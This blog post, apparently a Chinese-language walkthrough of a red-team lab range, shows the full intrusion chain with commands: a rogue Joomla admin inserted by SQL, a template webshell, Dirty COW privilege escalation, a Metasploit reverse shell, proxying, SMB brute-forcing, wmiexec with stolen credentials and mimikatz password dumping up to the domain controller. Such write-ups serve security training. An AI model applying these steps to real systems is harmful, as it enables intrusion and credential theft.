<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一条语句：</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `am2zu_users`</span><br><span class="line">   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;Administrator2&#x27;</span>, <span class="string">&#x27;admin2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;</span>, <span class="string">&#x27;&#x27;</span>, NOW(), NOW(), NOW());</span><br><span class="line"></span><br><span class="line">第二条语句：</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line"><span class="keyword">VALUES</span> (LAST_INSERT_ID(),<span class="string">&#x27;8&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/899.png" alt="图片"></p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/900.png" alt="图片"></p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/901.png" alt="图片"></p>
<h2 id="Joomla-Getshell"><a href="#Joomla-Getshell" class="headerlink" title="Joomla-Getshell"></a>Joomla-Getshell</h2><p>通过插入 <code>SQL</code> 数据我们成功添加了一个 <code>admin2</code> 用户，密码是 <code>secret</code>，登陆它的 <code>web</code> ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.93.100/administrator/index.php</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/902.png" alt="图片"></p>
<p>之后在模板新建一个 <code>php</code> 文件：<code>Extensions</code> -&gt; <code>Templates</code> -&gt; <code>Templates</code></p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/903.png" alt="图片"></p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/904.png" alt="图片"></p>
<p>访问 <code>http://192.168.93.100/templates/beez3/8888.php</code> 得到一枚 <code>SHELL</code>：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/905.png" alt="图片"></p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/906.png" alt="图片"></p>
<p>虽然得到了一枚 <code>webshell</code>，但是发现执行不了 <code>shell</code> 命令！但是呢可以切换目录，我切换目录到网站绝对路径下发现这些文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www/html</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">100600/rw-------  12288  fil   2019-10-28 09:43:47 -0400  .1.php.swp</span><br><span class="line">100600/rw-------  12288  fil   2019-10-20 02:52:20 -0400  .configuration.php.swp</span><br><span class="line">100644/rw-r--r--  28     fil   2019-10-24 09:25:46 -0400  1.php</span><br><span class="line">100644/rw-r--r--  27     fil   2019-10-24 09:44:42 -0400  2.php</span><br><span class="line">100644/rw-r--r--  18092  fil   2019-09-23 10:22:21 -0400  LICENSE.txt</span><br><span class="line">100644/rw-r--r--  4793   fil   2019-09-23 10:22:21 -0400  README.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  administrator</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  bin</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  cache</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  cli</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  components</span><br><span class="line">100644/rw-r--r--  1927   fil   2019-10-19 08:48:41 -0400  configuration.php</span><br><span class="line">100644/rw-r--r--  1927   fil   2019-10-19 08:50:00 -0400  configuration.php~</span><br><span class="line">100644/rw-r--r--  3159   fil   2019-09-23 10:22:21 -0400  htaccess.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  images</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  includes</span><br><span class="line">100644/rw-r--r--  1420   fil   2019-09-23 10:22:21 -0400  index.php</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  language</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  layouts</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  libraries</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  media</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  modules</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-09-23 10:22:21 -0400  plugins</span><br><span class="line">100644/rw-r--r--  829    fil   2019-09-23 10:22:21 -0400  robots.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-12-28 08:26:42 -0500  templates</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-12-28 08:26:42 -0500  tmp</span><br><span class="line">100644/rw-r--r--  1859   fil   2019-09-23 10:22:21 -0400  web.config.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/907.png" alt="图片"></p>
<p>执行不了命令那么我通过<code>疯狂翻目录</code>文件找到了一个 <code>test.txt</code> 文件，里面好像是一个账号密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adduser wwwuser</span><br><span class="line">passwd www</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/908.png" alt="图片"></p>
<p>通过得到的密码尝试 <code>SSH</code> 登陆：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/909.png" alt="图片"></p>
<p>登陆成功后查看了一下<code>内核</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/910.png" alt="图片"></p>
<h2 id="脏牛提权Linux"><a href="#脏牛提权Linux" class="headerlink" title="脏牛提权Linux"></a>脏牛提权Linux</h2><p>发现内核版本大于 <code>2.6.22</code> ，那么可以用脏牛提权（Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复））</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/FireFart/dirtycow/blob/master/dirty.c</span><br></pre></td></tr></table></figure>

<p>（到了这里我本来想放弃的，后来是问了团队的老哥给的思路方法才知道）</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/911.png" alt="图片"></p>
<p>提权成功，我们来切换一下用户 <code>firefart</code> ：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su firefart</span><br><span class="line">pass：my-new-password</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/912.png" alt="图片"></p>
<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><p>登陆成功！接下来通过 <code>MSF</code> 生成一个木马来得到一个 <code>shell</code> 进行后渗透：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/913.png" alt="图片"></p>
<p>通过 <code>xshell</code> 我发现上传不了文件：</p>
<p>后来通过 <code>WinSCP</code> 工具才上传成功的！</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/914.png" alt="图片"></p>
<p>给 <code>shell.elf</code> 文件<code>可执行</code>权限，然后运行后 <code>MSF</code> 反弹回来一个 <code>shell</code>：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/915.png" alt="图片"></p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/916.png" alt="图片"></p>
<p>之后先添加<code>路由表</code>扫描一下<code>内网存活</code>主机：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.93.1/24</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/917.png" alt="图片"></p>
<p>扫描存活主机使用的模块是这个：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/918.png" alt="图片"></p>
<p>这个时候扫描出来发现内网存活了这些：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">192.168.93.1</span><br><span class="line">192.168.93.10</span><br><span class="line">192.168.93.20</span><br><span class="line">192.168.93.30</span><br><span class="line">192.168.93.100</span><br><span class="line">192.168.93.120</span><br></pre></td></tr></table></figure>

<p>但是不知道它具体是什么操作系统，那么可以通过这个模块来对内网进行探测操作系统：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_version):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   RHOSTS     192.168.93.1/24  yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   SMBDomain  .                no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                     no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                     no        The username to authenticate as</span><br><span class="line">   THREADS    20               yes       The number of concurrent threads</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/919.png" alt="图片"></p>
<p>扫描出来有三台主机，其实探测出来的和我们<code>NMAP</code>信息搜集出来的结果八九不离十，只不过是我们知道了靶机 <code>IP</code> 的情况下才探测出来操作系统，而现在是通过横向渗透才知道的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] 192.168.93.20:445     - Host is running Windows 2008 Datacenter SP2 (build:6003) (name:WIN2008) (domain:TEST)</span><br><span class="line">[+] 192.168.93.10:445     - Host is running Windows 2012 R2 Datacenter (build:9600) (name:WIN-8GA56TNV3MV) (domain:TEST)</span><br><span class="line">[+] 192.168.93.30:445     - Host is running Windows 7 Professional SP1 (build:7601) (name:WIN7) (domain:TEST)</span><br></pre></td></tr></table></figure>

<p>以上三台主机是有 <code>TEST域</code>的，说明他们在一个<code>域</code>里！我通过<code>MSF</code> 爆破 <code>Windows 2008</code> 这台主机的 <code>smb</code> 登陆凭证爆破成功：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/920.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user：administrator</span><br><span class="line">pass：123qwe!ASD</span><br></pre></td></tr></table></figure>

<p>接着我先把它的流量代理出来，使用 <code>socks4</code> 代理：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/server/socks4a</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/921.png" alt="图片"></p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/922.png" alt="图片"></p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/923.png" alt="图片"></p>
<p>设置完毕后，配置 <code>proxychains</code> 在 <code>/etc/proxychains.conf</code> 这个文件，在末尾吧端口更改为刚刚设置监听的 <code>1080</code> 端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 	127.0.0.1 1080</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/924.png" alt="图片"></p>
<p>为了验证我们是否代理流量成功，我扫了一下 <code>192.168.93.20</code>（Windows 2008）这台主机的端口开放情况：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -T4 -P 80,1433,3306,3389 192.168.93.20</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/925.png" alt="图片"></p>
<p>扫描成功！这个时候就可以在扫它内网了！然后我本来想用 <code>Socks4</code>的，但是失败了不知道为啥，后面我又把它换成 <code>Socks5</code>：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/926.png" alt="图片"></p>
<p>在扫它内网之前我需要吧 <code>KALI</code> 这台主机的流量给代理出来，下面我用到的 <code>socks5</code>代理，工具是 <code>SSF</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Win10：ssfd.exe -p 1050</span><br><span class="line">KALI：./ssf -F 1051 -p 1050 192.168.1.103</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/927.png" alt="图片"></p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/928.png" alt="图片"></p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/929.png" alt="图片"></p>
<h2 id="获取域控密码拿到Flag"><a href="#获取域控密码拿到Flag" class="headerlink" title="获取域控密码拿到Flag"></a>获取域控密码拿到Flag</h2><p>代理成功后我们通过 <code>wmiexec</code> 去连接 <code>windows 2008</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe administrator:123qwe!ASD@192.168.93.20</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/930.png" alt="图片"></p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/931.png" alt="图片"></p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/932.png" alt="图片"></p>
<p>查看 <code>Windows 2008</code> 的 <code>ip</code> 后发现 <code>dns</code> 为 <code>test.org</code>，接着 <code>ping test.org</code> 获取到了域控制器的 <code>IP</code> ：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;ping test.org</span><br><span class="line"></span><br><span class="line">Pinging test.org [192.168.93.10] with 32 bytes of data:</span><br><span class="line">Reply from 192.168.93.10: bytes=32 time&lt;1ms TTL=128</span><br><span class="line">Reply from 192.168.93.10: bytes=32 time&lt;1ms TTL=128</span><br><span class="line">Reply from 192.168.93.10: bytes=32 time&lt;1ms TTL=128</span><br><span class="line">Reply from 192.168.93.10: bytes=32 time&lt;1ms TTL=128</span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> 192.168.93.10:</span><br><span class="line">    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),</span><br><span class="line">Approximate round trip <span class="built_in">times</span> <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/933.png" alt="图片"></p>
<p>这个时候尝试抓取 <code>test.org</code> 域里的 <code>administrator</code> 密码，先上传一个 <code>mimikatz</code> 到 <code>windows2008</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbclient //192.168.93.20/C$ -U administrator</span><br><span class="line">put mimikatz.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/934.png" alt="图片"></p>
<p>之后本来想用 <code>mimikatz</code> 读取密码的，但是在 <code>dos</code> 下进入不了 <code>mimikatz</code> 的交互界面…还是太菜了！我接着 <code>MSF</code> 生成了一个木马得到了 <code>Windows 2008</code> 的<code>shell</code>，然后直接运行 <code>getsystem</code> 得到了 <code>SYSTEM</code> 权限 ：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/935.png" alt="图片"></p>
<p>然后上传了一个 <code>mimikatz</code> 直接读取到了明文密码：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/936.png" alt="图片"></p>
<p>最后通过 <code>smb</code> 连接到了<code>2012</code>机器拿到 <code>flag</code>：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/937.png" alt="图片"></p>
<p>太菜了太菜了，中途各种百度各种Google，今年最后一篇文章就到这吧，明年再战！</p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>saulGoodman</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://example.com/2019/12/29/ATTCK-Red-Teaming-1/">http://example.com/2019/12/29/ATTCK-Red-Teaming-1/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
                    
                        <a href="/tags/CTF/"># CTF</a>
                    
                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
                    
                        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"># 内网渗透</a>
                    
                        <a href="/tags/ATTCK/"># ATTCK</a>
                    
                        <a href="/tags/RedTeaming/"># RedTeaming</a>
                    
                        <a href="/tags/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"># 横向渗透</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2020/02/11/Vulnhub-WTF-1/">VulnHub通关日记-WTF_1-Walkthrough，MITM中间人攻击拿到Flag</a>
            
            
            <a class="next" rel="next" href="/2019/12/28/CTF-BTRsys1/">CTF-BTRsys1_WriteUp，通过Sql注入绕过登陆界面获取shell拿Root</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
